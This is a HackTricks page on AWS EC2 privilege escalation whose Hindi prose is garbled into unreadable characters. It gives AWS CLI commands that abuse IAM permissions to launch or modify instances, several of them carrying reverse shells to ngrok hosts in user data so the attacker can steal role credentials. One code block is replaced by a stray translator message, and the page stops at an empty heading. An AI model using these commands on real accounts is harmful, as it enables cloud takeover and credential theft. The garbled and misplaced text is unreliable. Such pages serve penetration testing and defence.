# AWS - EC2 Privesc

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>

## EC2

рдЕрдзрд┐рдХ **рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП EC2** рджреЗрдЦреЗрдВ:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

`iam:PassRole` рдФрд░ `ec2:RunInstances` рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ **рдирдпрд╛ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ** рдЬрд┐рд╕рдХреА рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдЧреА рдФрд░ **рдЙрд╕реЗ рдореМрдЬреВрджрд╛ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**. рдлрд┐рд░ рд╡реЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдЯрд╛ рдбреЗрдЯрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд AWS рдХреАрдЬрд╝ рдХреА рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдЙрд╕ рд╕рдВрдмрдВрдзрд┐рдд рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓/рд╕рд░реНрд╡рд┐рд╕ рд░реЛрд▓ рдХреА рд╕рднреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓ рдЬрд╛рддреА рд╣реИред

* **SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪ**

рдЖрдк рдПрдХ **рдмрдирд╛рдИ рдЧрдИ** **ssh рдХреА** (`--key-name`) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдпрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЙрд╕рдореЗрдВ ssh рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрджрд┐ рдЖрдк рдирдпрд╛ рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ `ec2:CreateKeyPair` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ)ред
```bash
aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro \
--iam-instance-profile Name=iam-full-access-ip --key-name my_ssh_key \
--security-group-ids sg-123456
```
* **рдпреВрдЬрд░ рдбреЗрдЯрд╛ рдореЗрдВ rev shell рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕**

рдЖрдк рдПрдХ рдирдпрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ **рдпреВрдЬрд░ рдбреЗрдЯрд╛** (`--user-data`) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдПрдХ **rev shell** рднреЗрдЬреЗрдЧрд╛ред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдЖрдкрдХреЛ рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЧреНрд░реБрдк рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id ami-0c1bc246476a5572b --instance-type t2.micro \
--iam-instance-profile Name=EC2-CloudWatch-Agent-Role \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдиреЛрдЯ рдпрд╣ рд╣реИ рдХрд┐ рдЬрдм **EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдмрд╛рд╣рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рдпрд╣ рдПрдХ **рд╕реНрдкрд╖реНрдЯ рд╕рдВрдХреЗрддрдХ рд╣реИ рдХрд┐ рд╕рдордЭреМрддрд╛ рд╣реБрдЖ рд╣реИ**ред AWS GuardDuty рднреА рдЗрд╕ рдкрд░ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИ (https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types.html#unauthorized11), рдЗрд╕рд▓рд┐рдП рдпрд╣ рдмреБрджреНрдзрд┐рдорд╛рдиреА рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛рдП рдФрд░ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдП, рдмрд▓реНрдХрд┐ **AWS API рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рднреАрддрд░ рд╕реЗ рд╣реА рдХрд╛рдо рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП**ред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХрд┐рд╕реА рднреА EC2 рд░реЛрд▓ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдЬреЛ рдореМрдЬреВрджрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓реНрд╕ рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реБрдЖ рд╣реИред

#### ECS рдХреЗ рд▓рд┐рдП рдкреНрд░рд┐рд╡реЗрд╕реНрдХ

рдЗрд╕ рдкрд░рдорд┐рд╢рди рд╕реЗрдЯ рдХреЗ рд╕рд╛рде рдЖрдк **рдПрдХ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ ECS рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕ рддрд░рд╣, ECS **рд╕рд░реНрд╡рд┐рд╕реЗрдЬ** **EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕** рдХреЗ рдЕрдВрджрд░ **рдЪрд▓рд╛рдИ рдЬрд╛рдПрдВрдЧреА** рдЬрд╣рд╛рдБ рдЖрдкрдХреА рдкрд╣реБрдБрдЪ рд╣реИ рдФрд░ рдлрд┐рд░ рдЖрдк рдЙрди рд╕рд░реНрд╡рд┐рд╕реЗрдЬ (рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реНрд╕) рдХреЛ рдкреНрд░рд╡реЗрд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЙрдирдХреЗ ECS рд░реЛрд▓реНрд╕ рдЬреЛ рдЬреБрдбрд╝реЗ рд╣реБрдП рд╣реИрдВ, рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

рдирдП EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ **ECS рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдиреЗ** рдХреА рд╡рд┐рдзрд┐ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

рдпрджрд┐ рдЖрдк **рдирдпрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддреЗ** рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ `ecs:RegisterContainerInstance` рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдкрдВрдЬреАрдХреГрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╣рдорд▓реЗ рдХреЛ рдЕрдВрдЬрд╛рдо рджреЗ рд╕рдХрддреЗ рд╣реИрдВред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** ECS рд░реЛрд▓реНрд╕ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

рдкрд┐рдЫрд▓реА рдкрд░рд┐рд╕реНрдерд┐рддрд┐ рдХреЗ рд╕рдорд╛рди, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде **рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ IAM рд░реЛрд▓ рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ** рддрд╛рдХрд┐ рд╡рд╣ рдирдИ рд╕рд╛рдЦ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗред\
рдЪреВрдВрдХрд┐ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдореЗрдВ рдХреЗрд╡рд▓ 1 рд░реЛрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЕрдЧрд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдореЗрдВ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рд░реЛрд▓ рд╣реИ** (рдЖрдо рдорд╛рдорд▓рд╛), рддреЛ рдЖрдкрдХреЛ **`iam:RemoveRoleFromInstanceProfile`** рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

рдпрджрд┐ **instance profile рдореЗрдВ рдПрдХ role рд╣реИ** рдФрд░ рд╣рдорд▓рд╛рд╡рд░ **рдЗрд╕реЗ рд╣рдЯрд╛ рдирд╣реАрдВ рд╕рдХрддрд╛**, рддреЛ рдПрдХ рдФрд░ рдЙрдкрд╛рдп рд╣реИред рд╡рд╣ **рдПрдХ instance profile рдвреВрдВрдв рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЛрдИ role рдирд╣реАрдВ рд╣реИ** рдпрд╛ **рдирдпрд╛ рдПрдХ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ** (`iam:CreateInstanceProfile`), **role рдХреЛ рдЙрд╕ instance profile рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ** (рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЪрд░реНрдЪрд╛ рдХреА рдЧрдИ рдереА), рдФрд░ **instance profile рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП instance рд╕реЗ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ:**

* рдпрджрд┐ instance рдореЗрдВ **рдХреЛрдИ instance profile рдирд╣реАрдВ рд╣реИ** (`ec2:AssociateIamInstanceProfile`) \*

{% code overflow="wrap" %}
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрд▓рдЧ EC2 рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privesc (рдЖрдкрдХреЛ рдПрдХ AWS EC2 рдЙрджрд╛рд╣рд░рдг рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐ рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕реНрдерд┐рддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдЬреБрдбрд╝реА рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреЛ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХреЗ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рдЙрджрд╛рд╣рд░рдг рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛ рддреЛ рд╡рд╣ рдЗрд╕рд╕реЗ рдЬреБрдбрд╝реА рднреВрдорд┐рдХрд╛ рдХреЛ рдмрджрд▓рдХрд░ рдЕрдзрд┐рдХ рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИред

* рдпрджрд┐ рдЗрд╕рдореЗрдВ **рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╣реИ**, рдЖрдк рдЙрджрд╛рд╣рд░рдг рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреЛ **рд╣рдЯрд╛** рд╕рдХрддреЗ рд╣реИрдВ (`ec2:DisassociateIamInstanceProfile`) рдФрд░ рдЗрд╕реЗ **рдЬреЛрдбрд╝** рд╕рдХрддреЗ рд╣реИрдВ \*

{% code overflow="wrap" %}
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП instance рдХреА **instance profile** рдХреЛ **рдмрджрд▓реЗрдВ** (`ec2:ReplaceIamInstanceProfileAssociation`). \*

{% code overflow="wrap" %}
````
```bash
The provided text is a command and does not contain any prose to translate. It is a specific AWS CLI command used for replacing an IAM instance profile association in EC2, and as per your instructions, commands should not be translated. If you have any other text that requires translation, please provide it.
```
````
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрд▓рдЧ EC2 рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privesc (рдЖрдкрдХреЛ рдПрдХ AWS EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐ рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рд╕реНрдерд┐рддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

### `ec2:RequestSpotInstances`,`iam:PassRole`

рдЕрдиреБрдорддрд┐рдпреЛрдВ **`ec2:RequestSpotInstances`рдФрд░`iam:PassRole`** рд╡рд╛рд▓рд╛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **Spot Instance** рдХрд╛ **рдЕрдиреБрд░реЛрдз** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **EC2 рднреВрдорд┐рдХрд╛ рд╕рдВрд▓рдЧреНрди** рд╣реЛрддреА рд╣реИ рдФрд░ **user data** рдореЗрдВ рдПрдХ **rev shell** рд╣реЛрддрд╛ рд╣реИред\
рдПрдХ рдмрд╛рд░ рдЬрдм рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡рд╣ **IAM рднреВрдорд┐рдХрд╛ рдЪреБрд░рд╛** рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
{% endcode %}

### `ec2:ModifyInstanceAttribute`

**`ec2:ModifyInstanceAttribute`** рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИред рдЗрдирдореЗрдВ, рд╡рд╣ **рдпреВрдЬрд░ рдбреЗрдЯрд╛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ**, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╡рд╣ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ **рдордирдорд╛рдирд╛ рдбреЗрдЯрд╛ рдЪрд▓рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рд░рд┐рд╡ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЧреБрдгреЛрдВ рдХреЛ рдХреЗрд╡рд▓ рддрдм **рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдВрдж рд╣реЛ**, рдЗрд╕рд▓рд┐рдП **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** **`ec2:StopInstances`** рдФрд░ **`ec2:StartInstances`**ред
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХрд┐рд╕реА рднреА EC2 IAM рд░реЛрд▓ рд╕реЗ рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдЬреЛ рдмрдирд╛рдП рдЧрдП рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реЛред

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate` рдФрд░ `ec2:ModifyLaunchTemplate`** рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реИрдВ, рд╡рд╣ **рдирдпрд╛ Launch Template рд╕рдВрд╕реНрдХрд░рдг** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **user data** рдореЗрдВ **rev shell** рдФрд░ **рдХреЛрдИ рднреА EC2 IAM рд░реЛрд▓** рд╣реЛ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ **рдХреЛрдИ рднреА Autoscaler рд╕рдореВрд╣** рдЬреЛ рдЙрд╕ **Launch Template** рдХрд╛ **рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ** рдФрд░ **рдирд╡реАрдирддрдо** рдпрд╛ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╡рд╣ рдЙрд╕ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ **рдкреБрдирдГ рдЪрд▓рд╛рдПрдЧрд╛** рдФрд░ rev shell рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрд▓рдЧ EC2 рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`

